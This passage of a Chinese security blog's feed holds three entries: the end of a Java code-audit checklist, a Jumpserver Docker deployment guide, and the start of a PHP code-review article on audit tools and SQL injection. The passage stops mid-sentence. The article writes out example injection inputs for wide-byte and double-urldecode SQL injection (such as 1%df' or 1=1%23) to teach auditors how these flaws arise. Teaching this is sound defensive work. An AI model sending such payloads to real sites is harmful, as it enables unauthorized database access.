id="6-1-加密安全"><a href="#6-1-加密安全" class="headerlink" title="6.1 加密安全"></a>6.1 加密安全</h4><ul><li>密码是否以不可逆的哈希形态存储</li><li>是否使用不带salt的哈希算法来加密密码</li><li>加密哈希算法中的salt是否硬编码在代码中</li></ul><h4 id="6-2-密码安全"><a href="#6-2-密码安全" class="headerlink" title="6.2 密码安全"></a>6.2 密码安全</h4><ul><li>认证过程中传输的密码是否进行了加密处理</li></ul><p>可以采用哈希算法或者RSA等加密算法将密码加密后传递，或者是使用SSL来做传输层加密。</p><ul><li>修改密码功能是否进行了旧密码的验证或者是安全问题的确认</li><li>找回密码功能是否借用第三方途径</li></ul><p>第三方途径主要有电子邮件、手机短信等。这些途径应该是找回密码前预留的。</p><ul><li>找回密码功能是否采用验证码确认并重设机制</li></ul><p>部分应用的找回密码功能是直接将原密码发送到密码保护邮箱，这种方式存在一定的安全风险。</p><ul><li>检查密码设置页面是否对密码复杂度进行检查</li></ul><p>至少包含数字和字母，长度最少6位，避免用户输入弱口令</p><h3 id="0x08-调试-amp-接口"><a href="#0x08-调试-amp-接口" class="headerlink" title="0x08 调试&amp;接口"></a>0x08 调试&amp;接口</h3><h4 id="7-1-异常处理"><a href="#7-1-异常处理" class="headerlink" title="7.1 异常处理"></a>7.1 异常处理</h4><ul><li>是否捕获了应用出现的错误并阻止其输出给客户端</li></ul><p>详细的错误输出可能会导致SQL查询泄露、程序源代码泄露、物理路径泄露等。</p><ul><li>异常处理是否能够全面覆盖所有异常行为</li><li>异常处理是否会导致程序流程异常，引发安全问题</li></ul><p>备注：某些异常可能是致命的，但是如果程序捕获了异常，可能会导致程序绕过一些重要的步骤而直接执行后续的操作。</p><h4 id="7-2-数据接口"><a href="#7-2-数据接口" class="headerlink" title="7.2 数据接口"></a>7.2 数据接口</h4><ul><li>接口服务是否存在安全漏洞</li><li>接口服务后台登录是否存在弱密码</li></ul><p>例如：axis2，<a href="http://localhost:8080/axis2/axis2-admin/" target="_blank" rel="noopener">http://localhost:8080/axis2/axis2-admin/</a>，默认用户名/密码：admin/axis2，密码在webapps\axis2\WEB-INF\conf\axis2.xml里配置</p><ul><li>接口服务是否有默认的测试页面</li></ul><p>例如：axis2，<a href="http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径" target="_blank" rel="noopener">http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径</a></p><ul><li>接口服务应用是否包含身份认证，认证的帐号、密码（或密钥）的存储安全</li></ul><p>例如：使用WSS4J对SOAP报文体进行身份认证</p><ul><li>接口服务应用传输是否加密</li></ul><p>例如：使用WSS4J对SOAP报文体进行加密</p><ul><li>接口服务应用异常处理</li></ul><p>例如：Webservice应用对特殊字符的处理，是否会在报错信息中泄露数据，参考<a href="http://www.soapui.org/About-SoapUI/features.html#security-testing" target="_blank" rel="noopener">http://www.soapui.org/About-SoapUI/features.html#security-testing</a></p><h4 id="7-3-硬编码"><a href="#7-3-硬编码" class="headerlink" title="7.3 硬编码"></a>7.3 硬编码</h4><ul><li>代码中是否存在内置的敏感信息</li></ul><p>如：调试帐号、外部接口帐号/密码、数据加/解密密钥等</p><h3 id="0x08-日志审计"><a href="#0x08-日志审计" class="headerlink" title="0x08 日志审计"></a>0x08 日志审计</h3><h4 id="8-1-日志记录"><a href="#8-1-日志记录" class="headerlink" title="8.1 日志记录"></a>8.1 日志记录</h4><ul><li>应用是否会将用户密码记入日志</li><li>日志记录的内容是否合理，避免日志文件增长过快，造成磁盘空间不足</li></ul><h3 id="0x09-运行环境"><a href="#0x09-运行环境" class="headerlink" title="0x09 运行环境"></a>0x09 运行环境</h3><h4 id="9-1-应用配置"><a href="#9-1-应用配置" class="headerlink" title="9.1 应用配置"></a>9.1 应用配置</h4><ul><li>是否删除了不必要的网页、帐号及权限</li></ul><p>页面包括应用服务器的默认页面、管理后台、测试页面、备份文件等；帐号指Web应用服务器的运行帐户</p><ul><li>目录浏览是否被禁用</li><li>Web容器默认帐户的密码是否更改或禁用</li><li>不能删除的管理后台是否启用了密码保护</li><li>正式发布的应用是否包含开发调试文件、代码</li></ul><p>如SVN版本信息文件、调试工具/页面、功能模块中的调试接口等</p><ul><li>重要的配置信息是否进行了加密</li></ul><p>如数据库连接配置、其它接口连接配置等</p><h4 id="9-2-自定义错误"><a href="#9-2-自定义错误" class="headerlink" title="9.2 自定义错误"></a>9.2 自定义错误</h4><ul><li>是否自定义了403、404、500错误页面</li><li>错误页面是否会输出详细错误信息</li></ul><h4 id="9-3-日志管理"><a href="#9-3-日志管理" class="headerlink" title="9.3 日志管理"></a>9.3 日志管理</h4><ul><li>服务器是否开启了用户访问日志的记录</li><li>记录的日志是否满足问题回溯的要求</li></ul><p>是否记录了客户端地址、请求的方法、请求的URL、提交的参数（GET、POST、COOKIE参数）、请求的状态等</p><h3 id="0x10-第三方组件"><a href="#0x10-第三方组件" class="headerlink" title="0x10 第三方组件"></a>0x10 第三方组件</h3><p>分析应用使用的框架及引用的第三方组件，分析其是否存在各种已知漏洞，且当前环境漏洞是否可以重现</p><h4 id="10-1-框架"><a href="#10-1-框架" class="headerlink" title="10.1 框架"></a>10.1 框架</h4><ul><li>Struts/Struts 2</li><li>Turbine</li><li>Spring MVC</li><li>Hibernate</li><li>iBatis</li><li>DotNetNuke</li></ul><h4 id="10-2-编辑器"><a href="#10-2-编辑器" class="headerlink" title="10.2 编辑器"></a>10.2 编辑器</h4><ul><li>CKEditor/FCKEditor</li><li>eWebeditor</li><li>NicEdit</li><li>Free Rich Text Editor</li></ul><h4 id="10-3-上传组件"><a href="#10-3-上传组件" class="headerlink" title="10.3 上传组件"></a>10.3 上传组件</h4><ul><li>SmartUpload</li></ul><h3 id="0x11-安全功能"><a href="#0x11-安全功能" class="headerlink" title="0x11 安全功能"></a>0x11 安全功能</h3><p>对于比较重要的业务系统，例如：支付系统，可以参考以下条目，进行检测</p><h4 id="11-1-登录认证"><a href="#11-1-登录认证" class="headerlink" title="11.1 登录认证"></a>11.1 登录认证</h4><ul><li>重要系统是否使用了双因素登录认证，例如：数字证书，支付盾，密保卡等，防止用户密码泄露导致系统被非法登录</li><li>重要系统是否使用了安全控件，对用户提交的关键数据进行加密</li><li>重要系统的后台管理界面是否限制了访问源地址</li><li>系统的密码重置等短信发送等功能的使用频率是否进行了限制，例如：一个手机号一分钟只能发送一条短信，防止被恶意利用多次发送短信</li><li>用户登录时的用户名，状态，源地址等关键信息需要记录到应用日志中，管理员可以进行查询</li><li>如果用户在不常用的地址登录，系统会提示用户，并显示上一次登录的源地址</li><li>对于多次密码错误的登录尝试，系统能否检测，禁止源地址访问10分钟，管理员登录后可以看到，也可以进行查询</li></ul><h4 id="11-2-数据操作"><a href="#11-2-数据操作" class="headerlink" title="11.2 数据操作"></a>11.2 数据操作</h4><ul><li>系统中大数据量查询等影响系统负载的功能是否进行了查询范围限制，例如：只能查询最近3个月的数据</li><li>系统中大数据量查询等影响系统负载的功能是否进行了查询频率限制，例如：一分钟内只能查询一次</li><li>高可用性要求的系统中是否有用户请求频率检测，超过访问阈值时，需要用户输入页面上的图形验证码，才能进一步操作</li><li>对报表查询等涉及大量数据的读取和导出操作，是否严格限制了查询范围，必要时可以使用双用户认证，限制单个用户大量读取业务数据的能力</li><li>业务关键数据的读取页面，是否使用静态密码、手机动态密码等二次验证，防止敏感数据泄露，例如：交易详单的查询</li><li>业务处理过程中用户身份等关键识别信息，是否保存在服务端，禁止从客户端提交</li><li>业务处理过程中关键操作需要用户确认和图形验证码，手机动态验证码等保护，防止重放攻击，例如：转账操作等</li><li>关键业务操作需要记录到应用日志中，可以设置阈值，超过系统会告警，管理员可以进行查询。例如：转账金额大于20万的交易记录</li><li>涉及资金的业务用户可以设置上限，例如：用户可以设置每日最高消费限额，并在转账</li><li>关键业务操作可以设置短信提醒，例如：用户进行资金转账，进行详单查询等</li></ul><p><strong>文章转载于：<a href="http://blog.nsfocus.net/code-audit-instruction/" target="_blank" rel="noopener">http://blog.nsfocus.net/code-audit-instruction/</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-测试工具&quot;&gt;&lt;a href=&quot;#0x01-测试工具&quot; class=&quot;headerlink&quot; title=&quot;0x01 测试工具&quot;&gt;&lt;/a&gt;0x01 测试工具&lt;/h3&gt;&lt;h4 id=&quot;1-1-反编译java类&quot;&gt;&lt;a href=&quot;#1-1-反编译java类&quot; class=&quot;headerlink&quot; title=&quot;1.1 反编译java类&quot;&gt;&lt;/a&gt;1.1 反编译java类&lt;/h4&gt;&lt;p&gt;如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jumpserver的部署和基本使用</title>
    <link href="http://yoursite.com/2018/08/13/Jumpserver%E7%9A%84%E9%83%A8%E7%BD%B2%E5%92%8C%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/13/Jumpserver的部署和基本使用/</id>
    <published>2018-08-13T13:25:05.000Z</published>
    <updated>2018-08-13T14:41:00.624Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。</p></blockquote><a id="more"></a><h3 id="0x01-【安装环境】"><a href="#0x01-【安装环境】" class="headerlink" title="0x01 【安装环境】"></a>0x01 【安装环境】</h3><p><strong>CentOS Linux release 7.5.1804 (Core)</strong> </p><h3 id="0x02-【准备】"><a href="#0x02-【准备】" class="headerlink" title="0x02 【准备】"></a>0x02 【准备】</h3><p><strong>本次是使用docker安装jumpserver，所以要先在CentOS 7环境下安装Docker。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br><span class="line"></span><br><span class="line">yum -y install docker</span><br><span class="line"></span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h4 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="/images/Jumpserver/9.png" alt="upload successful"></p><h4 id="配置Docker"><a href="#配置Docker" class="headerlink" title="配置Docker"></a>配置Docker</h4><p><strong>设置镜像</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">\&gt;&#123;</span><br><span class="line"></span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>重启Docker</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure></p><h3 id="0x03-【安装步骤】"><a href="#0x03-【安装步骤】" class="headerlink" title="0x03 【安装步骤】"></a>0x03 【安装步骤】</h3><h3 id="Docker快速启动"><a href="#Docker快速启动" class="headerlink" title="Docker快速启动"></a>Docker快速启动</h3><p><strong>使用 root 命令行输入:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></p><p><strong>访问</strong></p><p><strong>浏览器访问: http://&lt;容器所在服务器IP&gt;:8080</strong></p><p><strong>SSH访问: ssh -p 2222 &lt;容器所在服务器IP&gt;</strong></p><p><strong>XShell等工具请添加connection连接</strong></p><p><strong>额外环境变量</strong></p><ul><li><strong>DB_ENGINE = mysql</strong></li><li><strong>DB_HOST = mysql_host</strong></li><li><strong>DB_PORT = 3306</strong></li><li><strong>DB_USER = xxx</strong></li><li><strong>DB_PASSWORD = xxxx</strong></li><li><strong>DB_NAME = jumpserver</strong></li><li><strong>REDIS_HOST = <redis-host></redis-host></strong></li><li><strong>REDIS_PORT = <redis-port></redis-port></strong></li><li><strong>REDIS_PASSWORD = &lt;</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 2222:2222 -e DB_ENGINE=mysql -e DB_HOST=192.168.1.1 -e DB_PORT=3306 -e DB_USER=root -e DB_PASSWORD=xxx -e DB_NAME=jumpserver  registry.jumpserver.org/public/jumpserver:1.0.0</span><br></pre></td></tr></table></figure></li></ul><p><img src="/images/Jumpserver/1.png" alt="upload successful"></p><p><strong>以上是实现在Docker下的安装，不过不建议在生产中使用, 因为所有软件都打包到一个Docker中了，不是Docker最佳实践。</strong></p><p><strong>在CentOS中安装请参考：<a href="http://docs.jumpserver.org/zh/docs/dockerinstall.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/dockerinstall.html</a></strong></p><h2 id="0x04-【快速入门】"><a href="#0x04-【快速入门】" class="headerlink" title="0x04 【快速入门】"></a>0x04 【快速入门】</h2><h4 id="架构说明"><a href="#架构说明" class="headerlink" title="架构说明"></a>架构说明</h4><p><img src="/images/Jumpserver/2.png" alt="upload successful"></p><h4 id="组件说明"><a href="#组件说明" class="headerlink" title="组件说明"></a>组件说明</h4><p><strong>jumpserver</strong></p><p>现指jumpserver管理后台，是核心组件（Core），使用Django Class BasedV 风格开发，支持Restful API</p><p><strong>COCO</strong></p><p>实现SSH Server和Web Terver的组件，提供SSH和WebSocket接口，使用Paramiko和Flask开发。</p><p><strong>Luna</strong></p><p>现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。</p><p><strong>Guacamole</strong></p><p>Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用。</p><p><strong>基本设置</strong></p><p>修改 URL 的 localhost 为你的实际 url 地址，否则邮件收到的地址将为 localhost 修改完 url 地址后需要重启 jumpserver 服务（重启才能生效，后续会解决这个问题）</p><p><img src="/images/Jumpserver/3.png" alt="upload successful"></p><p><strong>创建管理用户</strong><br><img src="/images/Jumpserver/4.png" alt="upload successful"></p><p># 如果使用ssh私钥管理资产，需要先在资产上设置，这里举个例子供参考（本例登录资产使用root为例） (1). 在资产上生成 root 账户的公钥和私钥    $ ssh-keygen -t rsa  # 默认会输入公钥和私钥文件到 ~/.ssh 目录 </p><p>连续三次回车后。生成了本机的私钥和公钥</p><p> (2). 将公钥输出到文件 authorized_keys 文件，并修改权限    $ cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys   $ chmod 400 ~/.ssh/authorized_keys</p><p> <img src="/images/Jumpserver/5.png" alt="upload successful"></p><p> (3). 打开RSA验证相关设置    $ vim /etc/ssh/sshd_config    RSAAuthentication yes   PubkeyAuthentication yes   AuthorizedKeysFile     .ssh/authorized_keys  (4). 重启 ssh 服务   $ service sshd restart  (5). 上传 ~/.ssh 目录下的 id_rsa 私钥到 jumpserver 的管理用户中  </p><p>sz id_rsa   #下载私钥到本地，再上传到jumpserver中</p><p># 这样就可以使用 ssh私钥 进行管理服务器  # 名称可以按资产树来命名。用户名root。密码和 SSH 私钥必填一个</p><p><strong>创建资产</strong><br><img src="/images/Jumpserver/6.png" alt="upload successful"></p><p># 点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。 # 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。 # IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能”牢靠”地登录指定的 IP 主机上。 资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。</p><p><strong>创建Windows系统用户</strong></p><p># 目前 Windows 暂不支持自动推送，用户必须在系统中存在且有权限使用远程连接，请确认资产的防火墙已经开放 注：Windows 资产协议务必选择 rdp # 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息</p><p><img src="/images/Jumpserver/7.png" alt="upload successful"></p><p><strong>创建Widoows资产</strong></p><p># 同创建 Linux 资产一样。 # 创建 Windows 资产，系统平台请选择正确的 Windows，默认 RDP 端口号为3389，IP 和 管理用户请正确选择， 注：确保管理用户能正确登录到指定的 IP 主机上</p><p><img src="/images/Jumpserver/8.png" alt="upload successful"></p><p><strong>Windwos资产连接说明：<a href="http://docs.jumpserver.org/zh/docs/faq_windows.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/faq_windows.html</a></strong></p><p><strong>Web终端</strong></p><p>Web 终端是资产使用界面，管理员和用户都是从这里登录到资产上，执行操作。点击资产名字连接资产，点击”Server”下的”Disconnect”断开资产连接。</p><p><img src="/images/Jumpserver/10.png" alt="upload successful"></p><p><strong>历史会话</strong></p><p>历史会话同在线会话包含的信息一样，都有用户、资产和 IP 地址等信息。Jumpserver 提供历史会话的录像观看。点击左侧的”回放”按钮，即可观看录像。</p><p><img src="/images/Jumpserver/11.png" alt="upload successful"></p><p><strong>更多文档参考：<a href="http://docs.jumpserver.org/zh/docs/admin_guide.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/admin_guide.html</a></strong></p><p><strong>安装问题：<a href="http://docs.jumpserver.org/zh/docs/faq_install.html" target="_blank" rel="noopener">http://docs.jumpserver.org/zh/docs/faq_install.html</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全运维" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="服务部署" scheme="http://yoursite.com/tags/%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Web 安全 代码审查之常规漏洞</title>
    <link href="http://yoursite.com/2018/08/12/Web-%E5%AE%89%E5%85%A8-PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5%E4%B9%8B%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/12/Web-安全-PHP-代码审查之常规漏洞/</id>
    <published>2018-08-12T14:39:00.000Z</published>
    <updated>2018-08-14T08:01:25.343Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><blockquote><p>工欲善其事，必先利其器。我们做代码审计之前选好工具也是十分必要的。下面我给大家介绍两款代码审计中比较好用的工具。</p></blockquote><a id="more"></a><h4 id="什么是源代码审查？"><a href="#什么是源代码审查？" class="headerlink" title="什么是源代码审查？"></a>什么是源代码审查？</h4><p>检查源代码中的缺点和错误信息，分析并找到这些问题引发的安全漏洞，并提供代码修订措施和建议;是一种以发现程序错误，安全漏洞和违反程序规范，为目标的源代码分析</p><p><strong>MVC设计模型：</strong></p><p><img src="/images/代码审计/1.png" alt="upload successful"></p><p><strong>Struts简介：</strong><br>Struts是Apache软件基金下一个项目。Struts有一组相互协作的类（组件）、Servlet以及jsp tag lib组成。基于struts构架的web应用程序基本上符合JSP Model2的设计标准，可以说是MVC设计模式的一种变化类型。  根据上面对framework的描述，很容易理解为什么说Struts是一个web framework，而不仅仅是一些标记库的组合。  但 Struts 也包含了丰富的标记库和独立于该框架工作的实用程序类。Struts有其自己的控制器（Controller），同时整合了其他的一些技术去实现模型层（Model）和视图层（View）。在模型层，Struts可以很容易的与数据访问技术相结合，包括EJB，JDBC和Object Relation Bridge。在视图层，Struts能够与JSP, Velocity Templates,XSL等等这些表示层组件相结合</p><p><strong>ZF框架：</strong><br>    Zend Framework(简写ZF)是由 Zend 公司支持<br>开发的完全基于 PHP5 的开源PHP开发框架，<br>可用于开发 Web 程序和服务，<br>ZF采用 MVC(Model–View-Controller) 架构模式<br>来分离应用程序中不同的部分方便程序的开发和维护。</p><p><strong>代码审计的方式</strong><br>通读原文：函数集文件、配置文件、安全过滤文件、index文件<br>程序结构：浏览源码文件夹，了解程序的大致目录<br>入口文件：web.xml、struts-xx.xml、spring-xxx.xml文件一般是整个程序的入口，从中可知道：程序的架构、运行流程、包含哪些配置文件、包含哪些过滤文件和安全过滤文件、了解程序的业务逻辑<br>配置文件：一般类似config.properties 等文件，保存一些数据库相关信息、程序的一些信息。<br>先看数据库编码，如果是gbk可能存在宽字节注入。<br>若变量的值用双引号、则可能存在双引号解析代码执行的问题<br>过滤功能：通过详读公共函数文件和安全过滤文件等文件，清晰掌握：<br>用户输入的数据，哪些被过滤，哪些无过滤如何过滤。<br>在哪里被过滤了？<br>如何过滤，过滤的方式是替换还是正则，有没有GPC，有没有使用 addslasher()处理？<br>能否绕过过滤的数据。</p><h3 id="0x02-代码审计工具1：Fortify-SCA"><a href="#0x02-代码审计工具1：Fortify-SCA" class="headerlink" title="0x02 代码审计工具1：Fortify SCA"></a>0x02 代码审计工具1：Fortify SCA</h3><p>Fortify SCA 是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。扫描的结果中不但包括详细的安全漏洞的信息，还会有相关的安全知识的说明，以及修复意见的提供。</p><p><strong>工作原理</strong><br>Foritfy SCA 首先通过调用语言的编译器或者解释器把前端的语言代码（如JAVA，C/C++源代码）转换成一种中间媒体文件NST（Normal Syntax Tree）将其源代码之间的调用关系，执行环境，上下文等分析清楚。然后再通过上述的五大分析引擎从五个切面来分析这个NST，匹配所有规则库中的漏洞特征，一旦发现漏洞就抓取出来。最后形成包含详细漏洞信息的FPR结果文件，用AWB打开查看。<br><img src="/images/代码审计/2.png" alt="upload successful"></p><p><strong>扫描结果：</strong><br>Fortify SCA 的结果文件为.FPR文件，包括详细的漏洞信息：漏洞分类，漏洞产生的全路径，漏洞所在的源代码行，漏洞的详细说明及修复建议等<br><img src="/images/代码审计/3.png" alt="upload successful"><br>目前Fortify SCA可以扫描出约350种漏洞，Fortify将所有安全漏洞整理分类，根据开发语言分项目，再细分为8个大类，约350个子类</p><h3 id="0x03-代码审计工具2：Seay源代码审计工具"><a href="#0x03-代码审计工具2：Seay源代码审计工具" class="headerlink" title="0x03 代码审计工具2：Seay源代码审计工具"></a>0x03 代码审计工具2：Seay源代码审计工具</h3><p><strong>功能介绍</strong><br>这些是seay 第一个版本的部分功能，现在最新版本是2.1、傻瓜化的自动审计、支持php代码调试、函数/变量定位、生成审计报告、自定义审计规则、mysql数据库管理、黑盒敏感信息泄露一键审计、支持正则匹配调试 、编辑保存文件、POST数据包提交 。<br><img src="/images/代码审计/4.png" alt="upload successful"><br><strong>安装方法</strong><br>安装环境需要 .NET2.0以上版本环境才能运行，下载安装包之后点击下一步就安装好了，非常的简便。<br>安装包下载地址：<a href="http://enkj.jb51.net:81/201408/tools/Seayydmsjxt(jb51.net).rar" target="_blank" rel="noopener">http://enkj.jb51.net:81/201408/tools/Seayydmsjxt(jb51.net).rar</a></p><h3 id="0x04-代码审计工具3：RIPS"><a href="#0x04-代码审计工具3：RIPS" class="headerlink" title="0x04 代码审计工具3：RIPS"></a>0x04 代码审计工具3：RIPS</h3><p><strong>文献参考：<a href="https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg</a></strong><br><strong>功能介绍</strong><br>RIPS 是一款基于 PHP 开发的针对 PHP 代码安全审计的软件。<br>另外，它也是一款开源软件，由国外安全研究员 Johannes Dahse 开发，程序只有 450KB，目前能下载到的最新版是0.55。<br>在写这段文字之前笔者特意读过它的源码，它最大的亮点在于调用了 PHP 内置解析器接口token_get_all，<br>并且使用Parser做了语法分析，实现了跨文件的变量及函数追踪，扫描结果中非常直观地展示了漏洞形成及变量传递过程，误报率非常低。<br>RIPS 能够发现 SQL 注入、XSS 跨站、文件包含、代码执行、文件读取等多种漏洞，支持多种样式的代码高亮。比较有意思的是，它还支持自动生成漏洞利用。<br><img src="/images/代码审计/5.png" alt="upload successful"></p><p><strong>安装方法</strong><br>下载地址：<a href="https://jaist.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip" target="_blank" rel="noopener">https://jaist.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip</a>.<br>解压到任意一个PHP的运行目录<br>在浏览器输入对应网址，可以通过下图看到有一个path 在里面填写你要分析的项目文件路径，点击 scan.</p><h3 id="0x05-代码审计实战"><a href="#0x05-代码审计实战" class="headerlink" title="0x05 代码审计实战"></a>0x05 代码审计实战</h3><p>通过刚才安装的两个审计工具运行后我们可以发现，会分析出很多隐藏的漏洞，那下面我们看看其中的SQL注入、XSS、CSRF产生的原因,通过原因来分析如何去审计代码。</p><h4 id="SQL-Injection-（SQL-注入攻击）"><a href="#SQL-Injection-（SQL-注入攻击）" class="headerlink" title="SQL Injection （SQL 注入攻击）"></a>SQL Injection （SQL 注入攻击）</h4><p>SQL注入攻击（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。</p><p><strong>SQL注入产生的原因</strong><br>程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行</p><p><strong>编码注入方式</strong><br>宽字节注入，这个是怎么回事呢？<br>在实际环境中程序员一般不会写上面类似的代码，一般都会用addslashes()等过滤函数对从web传递过来的参数进行过滤。不过有句话叫做，道高一尺魔高一丈，我们看看白帽子是怎么突破的。用PHP连接MySQL的时候，当设置 character_set_client=gbk时候会导致一个编码漏洞。我们知道addslashes() 会把参数 1’ 转换成 1\’,而我们提交参数 1%df’ 时候会转成 1縗’，那我们输入 1%df’ or 1=1%23时候，会被转换成 1縗’ or 1=1#’。<br>简单来说%df’会被过滤函数转义为%df\’ ，%df\’ = %df%5c%27  在使用gbk编码的时候会认为%df%5c是一个宽字节%df%5c%27=縗’，这样就会产生注入。<br>那如何防御这个宽字节呢？我希望大家开发网站尽量使用UTF8编码格式，如果转换麻烦，最安全的方法就是使用PDO预处理。挖掘这种漏洞主要是检查是否使用了gbk，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 。<br>二次urldecode注入，这中方式也是因为使用了urldecode不当所引起的漏洞。<br>我们刚才知道了 addslashes()函数可以防止注入，他会在(‘)、(“)、()前面加上反斜杠来转义。<br>那我们假设我们开启了GPC，我们提交了一个参数，/test.php?uid=1%2527,因为参数中没有单引号，所以第一次解码会变成uid=1%27,%25解码出来就是%，<br>这时候程序里如果再去使用urldecode来解码，就会把%27解码成单引号(‘)，最终的结果就是uid=1’.<br>我们现在知道了原有是因为urldecode引起的，我们可以通过编辑器的搜索urldecode和rawurldecode找到二次url漏洞。</p><p><strong>从漏洞类型区分可以分为三种类型</strong><br>可显：攻击者可以直接在当前界面内容中获取想要获得的内容。<br>报错：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中。<br>所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，所以我建议在数据库类中设置不抛出错误信息。<br>盲注：数据库查询结果无法从直观页面中获取攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。</p><p><strong>SQL 注入漏洞挖掘方法</strong><br>针对上面提到的利用漏洞方法，总结了以下的挖掘方法：<br>参数接收位置，检查是否有没过滤直接使用  _POST、$_COOKIE 参数的。<br>SQL语句检查，搜索关键词 select update insert 等SQL语句关键处，检查SQL语句的参数是否可以被控制。<br>宽字节注入,如果网站使用的 GBK 编码情况下，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 就行。<br>二次 urldecode 注入，少部分情况，gpc 可以通过编辑器的搜索 urldecode 和 